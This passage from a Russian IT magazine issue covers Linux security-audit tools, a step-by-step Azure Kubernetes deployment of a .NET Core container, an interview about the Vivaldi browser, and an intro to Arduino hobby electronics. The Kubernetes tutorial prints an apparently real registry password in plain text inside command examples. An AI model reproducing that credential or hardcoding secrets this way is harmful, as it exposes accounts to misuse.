Кстати, после установки утилиты неп лохо бы проверить локальную базу IoC
на обновления, сделать это можно с помощью команды Upgrader:


Loki ‐ Upgrader
optional arguments:
  ‐h, ‐‐help   show this help message and exit
  ‐‐sigsonly   Update the signatures only
  ‐‐progonly   Update the program files only
  ‐‐nolog      Don’t write a local log file
  ‐‐debug      Debug output





              Пример ведения лога при ска нировании

В первую очередь пристальное внимание обращаем на сообщения, выделен‐
ные красным. В поле DESCRIPTION дано описание файла и причины его
подозрительности. Обычно это вирусы, бэкдоры и другие подобные им прог‐
раммы.





         Информация об обна ружен ных вредоносных файлах


5. Linux Security Auditing Tool (LSAT)
LSAT — заключительный в нашей подборке инс трумент аудита безопасности
Linux. Особенность данной  тулзы  в ее модульном  дизайне,  который,
по заверениям разработчика, поз воляет добавлять новые функции проверки
очень оператив но. На сегодняшний момент в утилите заявлена поддержка
всех самых распространенных ОС: Linux — Gentoo, Red Hat, Debian, Mandrake
на архитектуре x86; SunOS (2.x), Red Hat, Mandrake на архитектуре Sparc;
а также Apple macOS.
   LSAT устанавливается с помощью сборки из исходников и имеет заранее
заготовленный автоконфиг — autoconf. Если ты не собираешься его править
на свой вкус, то можно сразу запустить компиляцию:


./configure
make
# Также можно установить LSAT в систему, путь расположения /usr/
local/bin
make install
# и очистить постинсталляционные файлы
make clean

Либо для Debian/Ubuntu‐дистрибутивов  уста новить  пакет можно прямо
из репозитория:


sudo apt‐get install lsat

Запускается утилита с помощью команды /lsat и добавленны ми опциями:


/lsat [OPTIONS]
Options:
    ‐d        diff current and old md5, output in lsatmd5.diff
    ‐f        Force a specific distribution test. Distro names are:
                  redhat
                  debian
                  mandrake
                  solaris
                  gentoo
                  macosx
                  If no ‐f option, lsat will guess. If lsat can
                  not guess the distribution, default is redhat.
    ‐a        Show this (advanced) help page
    ‐o        Output file name ‐‐ default is lsat.out
    ‐r        Check rpm integrity ‐‐ redhat or mandrake only
    ‐s        Silent mode
    ‐v        Verbose output
    ‐w        Output file in html format
    ‐x        eXclude module(s) in filelist from checks..


ЗАКЛЮЧЕНИЕ
Мы рассмотрели с тобой самые ходовые и в то же время очень кру тые и фун‐
кциональные тулзы для аудита безопасности Linux‐серверов. Теперь ты смо‐
жешь хорошо подготовиться к сертифика ционному или какому‐либо дру гому
compliance‐аудиту. Это также позволит тебе объективно оценить текущий
уровень защищенности и в автоматическом или полуавтоматическом режиме
оттюнинговать свою ферму Linux‐машин на максимальный показатель harden‐
ing index!
АДМИН

 КИБЕРНЕТИЧЕСКИЙ
  ОРКЕСТР

    ОРКЕСТРАЦИЯ КОНТЕЙНЕРОВ DOCKER
  С ПРИЛОЖЕНИЯМИ .NET CORE В ОБЛАКЕ





                                                                            Алексей Соммер
                                                                                    asommer@yandex.ru





Для обеспечения балансировки наг рузки, масштабируемос‐
ти и повышения отказоустойчивости могут использоваться
вспомогательные средства — оркестраторы. Среди них
большой популярностью сейчас пользуется сервис Kuber‐
netes. Самый простой способ попробовать его в деле —
развернуть его в обла ке, чем мы сегодня и займемся.


Первым делом заходим на портал Azure, нажимаем «Создать ресурс»
и находим сервис под названием Kubernetes Service. Выбираем имя и пре‐
фикс DNS на свой вкус. Имя влияет на то, как ты будешь обращаться к своему
кластеру, а вот префикс влияет на его FQDN‐адрес.





       Создание кластера Kubernetes в Azure. Основные настройки


             INFO

                      Прак тически сразу после релиза Google передала
                      проект Kubernetes в созданный при сот рудничес‐
                         тве с The Linux Foundation фонд под наз ванием
                        Cloud Native Computing Foundation.


Вторым шагом предлага ется создать service principal. Service principal —
это своеобразный сервисный аккаунт, под которым могут выполняться
какие‐то определенные задачи. Плюсы в том, что права такого аккаунта мож‐
но ограничить. Кроме того, можно создать любое количество подобных акка‐
унтов (в то время как число обычных акка унтов ограниче но подпиской). Най ти
созданные аккаунты service principal можно в Active Directory сре ди App
Registrations.





      Создание кластера Kubernetes в Azure. Проверка подлиннос ти

RBAC (role‐based access control) — это возможность ограничить или пре дос‐
тавить доступ к определенным ресурсам (или груп пам ресурсов). То есть ты
сможешь разграничить, какие пользователи подписки имеют права доступа,
а какие не имеют.





      Создание кластера Kubernetes в Azure. Сетевые подключения

На данный момент процесс занимает минут двадцать, но все может зависеть
от конфигурации. Найти официальные руководства можно по ссылкам соз‐
дание кластера AKS с помощью портала и создание кластера AKS с помощью
CLI.
  Для работы нам понадо бится командная строка Azure — CLI (Command
Line Interface). Ее можно уста новить как под Windows, так и под macOS
или Linux. Лично я пред почитаю использовать Azure Cloud Shell. Это коман‐
дная строка, которая запускается из загруженной в браузер страницы пор‐
тала Azure. Для работы она требует соз данного blob‐хранилища. Его сто‐
имость составит несколько центов в месяц, и потому я предпочитаю
не париться по поводу уста новки CLI на свою машину.
   Kubernetes поддерживает раз личные технологии контейнеров, но давай
рассмотрим самую популярную — Docker. Docker.hub поз воляет хранить один
приватный образ докера бесплатно. Если нужно больше, то можно раз‐
местить их за деньги. Но за деньги приватный образ докера можно раз‐
местить и в Azure Container Registry. Сейчас цены начинаются с 5 долларов
в месяц (за базовый SKU).
  Я создал сер вис ACR под именем myservice. Если ты тоже соберешься
воспользоваться ACR,  то пос ле  соз дания сервиса  будет необходимо
получить его клю чи.





                     Ключи доступа к ACR

Затем станет возможным залогиниться, выполнив команду


docker login myservice.azurecr.io

Вводим  взятые  с  портала  имя  пользователя  myservice  и  пароль
PJSeyO9=lCMRDI7dGkz68wjhFGRGxSY3. Теперь, зайдя в директорию с про‐
ектом, можно будет построить образ, одновременно пометив его нужным
тегом. А после этого отпра вить его в облачный сервис:


docker build ‐t myservice.azurecr.io/myservice .
docker push myservice.azurecr.io/myservice


Сек реты, сек реты… Пре доставляем доступ к образу и сохраняем
настройки
При работе с разверну тым AKS необ ходимо получить его креды. Иначе
команды kubectl не будут выполняться. Получить дос туп к AKS позволяет сле‐
дующая команда:


az aks get‐credentials ‐‐resource‐group KubernetesGroup ‐‐name veryco
olcluster

Для того чтобы получить дос туп к обра зу докера, рас положенному в репози‐
тории докера в приватном контейнере, понадобится создать секрет. Если
у тебя публичный образ, то этот шаг можно про пус тить. Для создания файла
секрета нужно выполнить команду такого вида:


kubectl create secret docker‐registry regcred ‐‐docker‐server=<
your‐registry‐server> ‐‐docker‐username=<your‐name> ‐‐docker‐password
=<your‐pword> ‐‐docker‐email=<your‐email>

Если твой образ находится в репозитории докера, то значением <your‐reg‐
istry‐server> будет https://index.docker.io/v1/. Для Azure Container
Registry FQDN — <registry‐name>.azurecr.io. То есть, чтобы создать сек‐
рет для контейнера в моем случае, я выполнил


kubectl create secret docker‐registry regcred ‐‐docker‐server="myserv
ice.azurecr.io" ‐‐docker‐username="myservice" ‐‐docker‐password=
"PJSeyO9=lCMRDI7dGkz68wjhFGRGxSY3" ‐‐docker‐email="asommer@yandex.ru"

Посмотреть  содержимое  созданного  файла  секрета  теперь  можно
с помощью команды


kubectl get secret regcred ‐‐output=yaml



Если ты используешь AKS, то можно не соз давать файл секрета, а предос‐
тавить доступ сервису AKS к сервису ACR иным способом — выполнив осо‐
бый скрипт. Взять его можно со следующей стра нички: Authenticate with Azure
Container Registry from Azure Kubernetes Service.


 #!/bin/bash
 AKS_RESOURCE_GROUP=KubernetesGroup
 AKS_CLUSTER_NAME=verycoolcluster
 ACR_RESOURCE_GROUP=MyACRGroup
 ACR_NAME=myservice
 # Get the id of the service principal configured for AKS
 CLIENT_ID=$(az aks show ‐‐resource‐group $AKS_RESOURCE_GROUP ‐‐name
 $AKS_CLUSTER_NAME ‐‐query "servicePrincipalProfile.clientId"
 ‐‐output tsv)
 # Get the ACR registry resource id
 ACR_ID=$(az acr show ‐‐name $ACR_NAME ‐‐resource‐group $ACR_RE
 SOURCE_GROUP ‐‐query "id" ‐‐output tsv)
 # Create role assignment
 az role assignment create ‐‐assignee $CLIENT_ID ‐‐role Reader
 ‐‐scope $ACR_ID


Можешь просто модифицировать зна чения переменных AKS_* и ACR_*, ско‐
пировать скрипт и вставить его в Azure CLI или Cloud Shell.
   Kubernetes содержит безопасное хра нилище учетных данных. То есть мож‐
но создать файл с настройками, и дос туп к этим нас тройкам получить извне
будет затруднительно. В этом файле обычно находятся строки под ключения
к базам данных и какие‐то креды. Если такой информации у тебя в приложе‐
нии нет (что, правда?), то этот шаг мож но пропустить.
   Чтобы создать файл с настройками из командной строки, нам понадобят‐
ся команды vi.
 • vi <имя файла> создаст файл, если он отсутс твует, или откроет сущес‐
   твующий.
 • Сохранить введенные изменения — ESC и пос ле этого ZZ.
 • Просто выйти без сохранения — ESC и после :q!.

Очень сокращенное описание, но его должно хватить. Могу добавить, что
может очень пригодиться использование клавиши Insert.
   Итак, через Azure Cloud Shell создаешь файл с произвольным названием
(допустим, appsettings.json) и необ ходимым содержимым. Допустим,
таким:


 {
   "ConnectionString": "some secret string goes there"
 }


И после выполняешь команду


 kubectl create secret generic secret‐appsettings ‐‐from‐file=/home/
 youraccount/appsettings.json


Эта  команда  создаст  секрет  с  настройками  под  именем  secret‐
appsettings. Узнать, на какой путь заменить /home/youraccount, можно
с помощью команды pwd.



Соз дание deployment
Deployments предназна чены для stateless‐сервисов (хорошо сказал, сразу
вспоминаются шутки про билингвов, митболы и сторител линг.  :) — Прим.
ред.). Они описывают то, как Pods и ReplicaSets будут созданы и как они будут
обновляться. Pod — это группа контей неров (или же один контейнер),
которые работают в одном окру жении. ReplicaSet следит за тем, чтобы ука‐
занное количество pod было запущено и постоянно работало.
  Я создаю файл deploy.yaml, который соз даст три пода. Файл содержит
следующий код (напоминаю, что пробелы в YAML очень важны):


apiVersion: apps/v1beta1
kind: Deployment
metadata:
  name: mydeployment
spec:
  replicas: 3
  minReadySeconds: 10
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
      maxSurge: 1
  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      ‐ name: app
        image: myservice.azurecr.io/myservice:latest
        ports:
        ‐ containerPort: 80
          name: http
          protocol: TCP
        imagePullPolicy: Always
        env:
        ‐ name: "ASPNETCORE_ENVIRONMENT"
          value: "Production"
        volumeMounts:
        ‐ name: secrets
          mountPath: /app/secrets
          readOnly: true
      imagePullSecrets:
      ‐ name: regcred
      volumes:
      ‐ name: secrets
        secret:
          secretName: secret‐appsettings

Рассмотрим код. В начале описывается количество реплик и стратегия
обновления. Затем деплойменту задается имя (myapp) и указывается ссылка
на образ контейнера. Про писываются порты: 80 — это стандартный порт
для HTTP. Далее идут ASP.NET Core’овские нас тройки environment’а. Затем
монтируются креды приватного образа докера и секретные нас тройки при‐
ложения, которые мы не так давно соз давали.


  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
      maxSurge: 1

Этот кусок отве чает за процесс обновления. maxSurge — количес тво подов,
создаваемых сверх существу ющих при обновлении (в штуках или процентах).
maxUnavailable — максимальное количес тво подов, которые могут ста‐
новиться недоступными во время обновления.
   Deployment можно соз дать с помощью команды


kubectl apply ‐f deploy.yaml


Знакомься — ingress
Для того чтобы предоставить доступ к сервисам кластера и организовать
балансиров ку нагрузки, используется сервис под наз ванием ingress. Доволь‐
но популярен ingress, соз данный на основании nginx. Проще всего его уста‐
новить, используя пакетный менеджер Kubernetes, который называется helm.
Плюсом Azure Cloud Shell будет то, что helm уже в нее установлен. Для уста‐
новки nginx‐ingress остается ввес ти


helm init

подождать немного и выполнить


helm install stable/nginx‐ingress ‐‐namespace kube‐system ‐‐set rbac.
create=false


Соз дание SSL-сертификатов с помощью Let’s Encrypt
Так как SSL‐сертификат привязывается к какому‐то доменному имени, то
зададим нашему ресурсу DNS‐имя. Выполним следующую команду и возь‐
мем внешний (external) IP:


kubectl get service ‐l app=nginx‐ingress ‐‐namespace kube‐system

Подставим IP и придуманное нами имя для суб домена в сле дующий скрипт:


#!/bin/bash
# Public IP address of your ingress controller
IP="168.63.19.2"
# Name to associate with public IP address
DNSNAME="myservice‐ingress"
# Get the resource‐id of the public ip
PUBLICIPID=$(az network public‐ip list ‐‐query "[?ipAddress!=null]|[
?contains(ipAddress, '$IP')].[id]" ‐‐output tsv)
# Update public ip address with DNS name
az network public‐ip update ‐‐ids $PUBLICIPID ‐‐dns‐name $DNSNAME

Этот скрипт просто ско пируем, вставим в командную строку и таким образом
выпол ним. В качестве имени для субдомена я задал очень оригинальное
имя — myservice‐ingress.
   Установим менеджер сертификатов, ана логичным способом скопировав
и вставив в командную строку следующий скрипт. Здесь даже ничего особо
менять не нужно.


helm install \
‐‐name cert‐manager \
‐‐namespace kube‐system \
stable/cert‐manager \
‐‐set ingressShim.defaultIssuerName=letsencrypt‐prod \
‐‐set ingressShim.defaultIssuerKind=ClusterIssuer \
‐‐set rbac.create=false \
‐‐set serviceAccount.create=false



Если бы у нас кластер был с RBAC, то скрипт был бы другим.


 helm install stable/cert‐manager ‐‐set ingressShim.defaultIssuerName
 =letsencrypt‐staging ‐‐set ingressShim.defaultIssuerKind=Cluste
 rIssuer




Если файл сертификата имеется в наличии, то можно его добавить как‐то так:


kubectl create secret tls tls‐secret ‐‐cert CERT.crt ‐‐key
KEY‐FOR‐CERT.key

Но поскольку у нас сертификата, подписанного CA, нет, придется немного
потанцевать с бубном. Мы соз дадим CA с помощью бесплатного сервиса
под названием Let’s Encrypt. Let’s Encrypt — это Certiﬁcate Authority, который
выдает сертификаты совершенно бес платно. Такая вот альтруистическая
организация, цель которой — безопас ный интернет.
   Итак, создаем файл cluster‐issuer.yaml. Он описывает организацию,
выдавшую сертификат.


apiVersion: certmanager.k8s.io/v1alpha1
kind: ClusterIssuer
metadata:
  name: letsencrypt‐prod
spec:
  acme:
    server: https://acme‐v02.api.letsencrypt.org/directory
    email: youeemail@yourdomain.ru
    privateKeySecretRef:
      name: letsencrypt‐prod
    http01: {}

Тебе необходимо только заменить email на свой адрес, и можно выполнять


kubectl apply ‐f cluster‐issuer.yaml

Затем создаем файл сертификата certificate.yaml, указав имя созданного
ClusterIssuer и домен, для которого предназна чен сертификат, — myservice‐
ingress.westeurope.cloudapp.azure.com.


apiVersion: certmanager.k8s.io/v1alpha1
kind: Certificate
metadata:
  name: tls‐prod‐secret
spec:
  secretName: tls‐prod‐secret
  dnsNames:
  ‐ myservice‐ingress.westeurope.cloudapp.azure.com
  acme:
    config:
    ‐ http01:
        ingressClass: nginx
      domains:
      ‐ myservice‐ingress.westeurope.cloudapp.azure.com
  issuerRef:
    name: letsencrypt‐prod
    kind: ClusterIssuer

Выпол няем:


kubectl apply ‐f certificate.yaml


Соз дание сервиса и ingress
В Kubernetes можно создавать сервисы четырех типов.
 1. Сервис по умолчанию — ClusterIP. Дос туп к этому сервису возможен толь‐
   ко из кластера по внутреннему IP.
 2. NodePort автоматически соз дает сервис ClusterIP. Доступ к NodePort воз‐
  можен извне по маршруту <NodeIP>:<NodePort>.
 3. Балансировщик нагрузки LoadBalancer предос тавляет доступ к сервису
   извне, автоматически создавая сервисы NodePort и ClusterIP.
 4. ExternalName связывает сервис со внешним именем.

Нам хватит базового сервиса:


apiVersion: v1
kind: Service
metadata:
  name: myservice
spec:
  type: ClusterIP
  ports:
    ‐ port: 80
      name: http
      targetPort: http
  selector:
    app: myapp

Значением selector мы ука зываем имя нашего деплоймента. Остается соз‐
дать сервис:


kubectl apply ‐f service.yaml

И в качестве заключительного этапа соз даем ingress. В YAML мы укажем имя
cluster‐issuer и сертификата. Их мы создавали ранее.


apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: myingress
  annotations:
    kubernetes.io/ingress.class: nginx
    certmanager.k8s.io/cluster‐issuer: letsencrypt‐prod
    nginx.ingress.kubernetes.io/rewrite‐target: /
spec:
  tls:
  ‐ hosts:
    ‐ myservice‐ingress.westeurope.cloudapp.azure.com
    secretName: tls‐prod‐secret
  rules:
  ‐ host: myservice‐ingress.westeurope.cloudapp.azure.com
    http:
      paths:
      ‐ path: /
        backend:
          serviceName: myservice
          servicePort: 80

Через какое‐то время пос ле соз дания ingress с помощью все той же команды
kubectl apply наш мик росервис должен стать дос тупным по адре су https://my‐
service‐ingress.westeurope.cloudapp.azure.com.    Кликнув    на    замочек
в адресной стро ке браузера рядом с https, можно убедиться, что сертификат
валидный и выдан CA.





                         Сер тификат
GEEK

     ПРИЗНАКИ
      «ОПЕРЫ»

                  ЙОН ФОН ТЕЧНЕР
                   ОБ ИДЕОЛОГИИ
                      БРАУЗЕРА VIVALDI





                                                                        Андрей Письменный
                                                                                   Шеф‐редактор
                                                                                     apismenny@gmail.com





«Хакер»  побеседовал  с  сооснователем  фирмы  Opera
и основателем Vivaldi Йоном фон Течнером, чтобы узнать
о больших целях и о насущных проблемах, которые стоят
перед разработчиками нового браузе ра.


                                   Беседовал Андрей Письменный


             INFO

                   В 2014 году «Хакер» уже публиковал интервью
                        с Йоном фон  Течнером —  в  то  время  он
                   еще работал в Opera и все было совсем по‐дру‐
                         гому. Однако знание тогдашней ситуации во мно‐
                      гом полезно для понимания нынешней. Также
                        в «Хакере» публиковалась статья Ильи Шпань‐
                        кова — русского пок лонника Opera, которому уда‐
                       лось войти в ее команду. Илья, в частности, зат‐
                        рагивает историю о покуп ке Opera китайской
                     компанией Qihoo 360.



ДВИЖОК
— В последнее вре мя раз нооб разие браузе ров сильно снизилось,
и  большинство  альтернативных  вариантов  используют  Blink.
Как вы отно ситесь к это му? Быть может, это нормальный про-
цесс?
 — Сегодня у большинства бра узеров постепенно сокращается функци‐
ональность, но, к счастью, Vivaldi меня ет эту ситу ацию, и мы уже видим
положительные сдвиги на рынке. В самом Vivaldi реализована масса полез‐
ных функций, и некоторые из них уже используются в других браузе рах. Я счи‐
таю, что эта тенденция зас тавит остальных про изводите лей браузеров внести
коррективы в стратегию развития своих про дуктов.
  В течение многих лет все бра узеры использовали один из трех движков
(Trident, Mozilla и Presto). Теперь таких движков стало четыре: Trident, Mozilla,
Blink и WebKit (хотя WebKit является частью  Blink). Я считаю, что отказ
от Presto был большой ошибкой, и если бы я не ушел из Opera, то ни за что
не допустил бы этого. Не надо забывать, что раз работка браузе ра с чистого
листа, мягко скажем, нетривиальная задача, поэтому все появившиеся
за последние двадцать лет бра узеры разработаны на базе одного из сущес‐
твующих движков.
  — Используются ли в  Vivaldi какие‑то модификации к Blink
или осо бые настройки? Дру гими сло вами, это один в один тот же
движок, что и в Chromium, или есть какие‑то отличия?
 — Мы добавили некоторые функции в Blink и ста раемся под держивать их.
Однако эта поддержка связана с большими затратами, поэтому мы вносим
только минимальные изменения в сам Blink, но сделали множество изме‐
нений в оболочке это го движка. Весь пользовательский интерфейс Vivaldi
разработан за предела ми Blink, и для его реализации потребовались только
незначительные изменения.
  — Участву ет ли ваша коман да в раз работке Blink? Если нет, то
воз можно ли это в будущем?
 — Мы написали для него некото рые пат чи и планируем и дальше учас тво‐
вать в этом проекте.


Vivaldi 2.0
26 сентября 2018 года, через два с половиной года пос ле выхода первой
версии, свет увидел Vivaldi 2.0. В обновлении появилось множество полез‐
ных, интересных и иногда неоднозначных фич. Разработчики сообщают, что
со времен первого релиза они сделали свыше 1500 улучшений.
   Вот несколько наиболее заметных и зна чимых вещей в версии 2.0.
   Vivaldi Sync — встро енный сервис син хро низации закладок, данных
для автозаполнения, рас ширений, заметок и хис тори (сохраняются только те
ссылки, что были введены вручную).





Но вовведения в боковой панели. Здесь живет немалая часть допол‐
нительных функций браузера. Помимо истории и закладок, ты найдешь здесь
менеджер вкладок с древовидной структурой, заметки (с возможностью прик‐
ладывать скриншоты и ссылки на сайты), а также веб‐панели — закладки,
которые открываются в виде узкой колонки.





       Теперь ты можешь читать «Хакер», когда ты читаешь «Хакер»!

До пол нительные опции кастомизации. Например, адресную строку
можно перенести вниз или вообще отключить, если вдруг захочется.
   Есть и более легкомыс ленные фичи. Нап ример, верхняя панель по умол‐
чанию меняет цвет в зависимос ти от посещаемо го сай та: на google.com она
будет синей, а если зайти на xakep.ru, она станет благородного черного цве‐
та.



ФУНКЦИИ И ПОЛЬЗОВАТЕЛЬСКИЙ ИНТЕРФЕЙС
— Каковы ваши приоритеты в плане UI/UX?
 — Главное для нас — это разнообразие функций и гибкость. Практичес ки
каждую операцию можно выполнить несколькими способами, поэтому поль‐
зователь может выбрать наиболее удоб ный для себя. Наши конкуренты сок‐
ращают функциональность своих браузеров, а мы, наоборот, расширяем,
причем Vivaldi предоставляет пользователю толь ко те функции, которые ему
нужны сейчас. Мы знаем, что если многие люди используют один и тот же
софт, то у них могут быть раз ные предпочтения и задачи, поэтому мы особое
внимание уделяем гибкости использования браузера.
  Мы ориентируемся на наших пользователей. Вмес то слежки за ними мы
собираем пожелания и комментарии и ста раемся учи тывать их при разработ‐
ке браузера.
   Если говорить о пользовательском интерфей се браузера, то он у нас
очень современный и красивый, и пользователь может настроить его по сво‐
ему вкусу.
  — Как вы решаете, какие новые фун кции включить в браузер?
Есть ли какое‑то прин ципиальное отличие от преж ней иде оло гии
Opera?
 — Новые функции разрабатываются по разным сценариям. Они могут
быть результатом мозгового штурма либо воп лощением идеи, которая приш‐
ла в голову одному из раз работчиков или любому другому сотруднику, а также
разрабатываться в ответ на зап рос пользователя. Иногда функция дол го
обдумывается и обсуждается, а в дру гих случаях кто‐то прос то реализует
свою идею. У нас нет жес ткой процедуры раз работки, для нас главное — воп‐
лощение инноваций любым способом.
   Когда я работал в Opera, компания следова ла тем же принципам, но после
моего ухода ситуация там кардинально изменилась. Мы продол жаем лучшие
традиции бывшей Opera.
  — Планиру ете ли вы добавить какие‑то фун кции, которые были
в Opera, но были убраны после сме ны курса? Например, Unite.
 — Мы уже реализова ли большинс тво функций Opera и ряд дополнитель‐
ных. Поскольку для нас приоритеты — это гиб кость и мнение пользователей,
то впол не логичным было добавить в наш бра узер функции Opera, но при
этом пойти дальше и также реализовать функции, которых никогда раньше
не было в браузерах. Я говорю о группировке вкладок, о размещении сгруп‐
пированных вкладок в одном окне, о встроенной функции снимков экрана и,
конечно, о новой функции прос мотра и анализа исто рии. Мы внедряем инно‐
вации каждый день.
   Unite — это великолепная технология, но в кратковре менной перспективе
не имеет смысла заново строить всю плат форму (хотя мы используем прин‐
ципы Unite), поэтому концентрируем свои усилия на других проектах, нап‐
ример на разработке встроенного клиента электронной почты, который вый‐
дет в ближайшее время.
  — Сре ди главных достоинств  Vivaldi перечисляется приват-
ность. Это значит только то, что вы не собираете пользователь-
ские дан ные, или же есть планы внед рить какие‑то защитные
механиз мы (например, защиту от фин герприн тинга или встро-
енный прок си)?
 — Разумеется, приватность крайне важна, и главное для нас — соб‐
людение приватности пользователей. В отличие от других браузеров, у нас
для пользовате ля не создаются про фили ни в онлайне, ни локально. Мы
не собираем никакую ста тистику использования. Вместо того чтобы тайно
следить за тем, как используется браузер, мы спрашиваем у пользователей,
что бы они хотели усовершенство вать.
  Мы также реализовали некоторые важ ные воз можности выбора для поис‐
ка. По умолчанию в адресной строке не выводится подсказ ка для поиска.
Это сделано потому, что функция «подсказка для поиска» пересы лает поис‐
ковому сервису все, что пользователь вво дит в адресной строке. Мы также
сотрудничаем и с такими поисковика ми, как DuckDuckGo и Qwant, потому что
у них тот же подход к защите приватности в интернете, что и у нас.
  Мы будем и дальше добавлять в браузер функции, обеспечивающие
защиту личной информации пользователя.
  — Некото рые браузе ры стали по умол чанию скры вать пол ный
адрес сайта из адресной стро ки. Что вы думаете о таком поведе-
нии? Почему решили не делать так в Vivaldi?
 — Мы считаем, что поль зователь дол жен видеть информацию о сайтах,
которые он посещает, и будем и дальше обеспечивать отображение этой
информации.


OPERA
— Кто‑то из бывших раз работчиков Opera участву ет в раз работке
Vivaldi?
 — Да, в Vivaldi перешли многие бывшие сотрудники Opera, включая раз‐
работчиков, системных администраторов, персонал из отде лов QA и HR. Я
рад, что продолжаю работать со своими бывшими коллегами по Opera.
  — Как вы оце ниваете долю бывших пользовате лей Opera сре ди
пользовате лей Vivaldi?
 — Это трудно сказать, если чес тно. Но, судя по данным о посещениях
нашего сайта, процент пользователей Opera среди них больше, чем в целом
доля этого браузера на рын ке. Вполне воз можно, что бывшие пользователи
Opera, разочарованные изменением стратегии развития этого браузера,
переходят на наш браузер либо на Chrome или Firefox. Судя по статис тике,
большинство наших поль зователей рань ше использовали Chrome.
  — И кстати, каково иметь свое преж нее тво рение в числе кон-
курен тов?
 — Если бы Opera не отказалась от Presto и не изменила философию раз‐
работки, то я бы не ушел из этой компании и не основал бы Vivaldi. Кроме
меня, Opera покинули многие ведущие сотрудники, и сейчас от этой ком‐
пании фактически осталось только название. Так что это уже не мое детище,
а нечто иное.


БИЗНЕС
— А Google вы рассматриваете в качестве кон курен та?  Vivaldi
одновре мен но использует ее технологии и соревнуется за поль-
зовате лей с Chrome. У вас нет опасения, что рано или поз дно
такая зависимость может стать проб лемой?
 — Google — это один из наших главных конкурентов. Эти ребята играют
очень жестко. Иногда для дос тупа к сервисам Google мы вынуждены скрывать
свои идентификационные данные, иначе они нас блокируют. Разумеется,
это трудный соперник, но и мы не пер вый год в бизнесе. Мы много лет кон‐
курируем с Microsoft, Apple и Google и зна ем, как выжить, когда большой вен‐
дор применяет против нас запрещенные при емы.
  — Думаю, не сек рет, что источник дохода Vivaldi — это рек-
лама. На ваш взгляд, это перспек тивная биз нес‑модель? Рас-
сматривались ли дру гие варианты?
 — Похоже, вы больше меня знаете про биз нес компании!
  Наша бизнес‐модель основана не на доходах от рекламы, а на доходе
от поиска, и некото рые из наших закладок также дают прибыль, когда ими
кто‐то пользует ся. Не могу ска зать, что  у нас фантастические доходы
на одного пользователя, но они растут из года в год. Я считают такую биз‐
нес‐модель оптимальной для нас и не собира юсь ее менять. Для нас совер‐
шенно неприемлема бизнес‐модель, основанная на сборе и продаже данных
о пользователях браузера.
  — Как вы отно ситесь  к инициативам типа  Acceptable Ads
и решению Google бло киро вать некото рые виды рек ламы?
 — Самая плохая реклама — это та, которая использует слежку за поль‐
зователем для отоб ражения рекламных объявлений. К сожалению, такая рек‐
лама есть у Google, Facebook и многих дру гих компаний. Большие рекламные
объявления раздражают пользователей, и их должно быть как можно меньше,
но намного хуже реклама, использующая слежку за пользователями.
  — О поисковике Qwant мно гие недавно узнали как раз благода-
ря Vivaldi. На выбор есть и дру гие малопо пулярные опции (Ecosia
и StartPage). Это коммерческое партнерство? Предъ являете ли
вы какие‑то тре бования к про вайдерам поиска?
 — Да, это коммерчес кое партнерс тво. Мы стараемся выбирать те поис‐
ковые механизмы, которые наиболее выгодны для нас. Поэтому в качестве
основных опций нашего браузера предлагаем Qwant, DuckDuckGo, Ecosia
и StartPage. Мы также поддерживаем в качес тве опции и самые известные
поисковики, но надеемся, что бла года ря сот рудничеству с Vivaldi популяр‐
ность названных выше четырех поисковиков вырас тет — это будет лучше
и для пользователей, и для рын ка.
GEEK

        Я У МАМЫ
  ИНЖЕНЕР



                           КАК ПЕРЕСТАТЬ
                   БОЯТЬСЯ ПАЯЛЬНИКА
                    И НАЧАТЬ ТВОРИТЬ





            Яков Ковач
        yakovachyakov@gmail.com





Ты наверняка встречал в интернете потрясающие проекты
вроде оркестра из дисководов, который исполняет тему
Дарта Вейдера, или ма кета портальной пуш ки из «Рика
и Морти», или динамической подсветки монитора, или еще
бесконечного количества полезных, забавных и даже слегка
безумных изобретений. Если тебе вдруг захотелось сделать
что‐то такое самостоятельно, а никаких познаний в электро‐
и схемотехнике у тебя нет, то в этой статье я постараюсь
помочь, рассказав, с чего начинать.


Предположим, что у тебя появилось желание соз дать свой неповторимый
проект. Уже есть идея и представление о том, что будет делать твой гаджет,
но тут ты сталкиваешься с закономерным воп росом: как? Школьный курс
физики давно забыт, а Google предлага ет такое количество информации, что
совершенно неясно, с чего начать.


        WWW

                     Возможно, твои первые проекты будут полным
                      провалом, но видео на канале восхитительной
                    Симоны Гирц всегда смогут тебя приободрить,
                       а может быть, и вдохновить.


Сейчас проще всего начинать с покупки одноплатного компьютера или мик‐
роконтроллера и выбора модулей к нему — благо сто ит все это не так дорого.
Провода и электронные компоненты ты тоже легко найдешь по приемлемым
ценам, а кое‐что сможешь даже поза имство вать из старого сломанного ноут‐
бука или другой отслужившей свой век техники. Но сначала нужно опре‐
делиться, что именно брать в качес тве основы.


ВЫБОР ПЛАТФОРМЫ: ARDUINO ИЛИ RASPBERRY PI
Две самые знаменитые платформы для реализации проектов «сделай сам» —
это микрокомпьютер Raspberry Pi и микроконтрол лер Arduino. А знаменитость
в таких случаях означает мас су совместимых компонентов и мануалов,
которые можно применять без изменений.





                       Arduino Uno и Raspberry Pi 3B+

Arduino — это опенсорсная пла та на основе чипов Atmel ATmega 8/168/328
AVR. Ее основное назначение — работа с датчиками и сенсорами. Эта плата
прекрасно подходит для прос тых проектов, где от устройства тре буется толь‐
ко реагировать на поступающие данные.


        WWW

                     На сайте Iarduino ты найдешь проекты, которые
                   можно освоить с использованием только готовых
                      модулей на платформе Arduino.


Для начала работы с Arduino понадобится среда разработки — Arduino IDE.
В ней обычно пишут на Arduino programming language. Но есть и поддержка
С и С++.
  Софт для работы с Arduino прост в использовании и не вызовет вопросов
у новичка, но при этом он дос таточно гиб кий, чтобы не переставать им поль‐
зоваться и потом. Arduino IDE без проблем идет в Mac, Windows и Linux.
  В общем, Arduino — это мастхев для любого желающего начать мастерить
что‐то  электронное. В  качес тве  стартового  проекта  подой дет любой
из готовых наборов либо что‐то из наработок сообщества Arduino. Самый
простой вариант можно соб рать на ма кетной плате.
  В модельной линейке фирменных Arduino есть раз ные варианты. В первую
очередь тебе пригодятся Uno или Leonardo.





              Таблица сравнения моделей Uno и Leonardo

Основная разница между ними в том, что Leonardo может подключаться
не только как СОМ‐порт, но и как мышка или клавиатура. В остальном раз‐
ница между Uno и Leonardo не принципиальна. Зато когда ты возьмешься
за более амбициозные проекты, то обязательно посмотри на Mega и Duo,
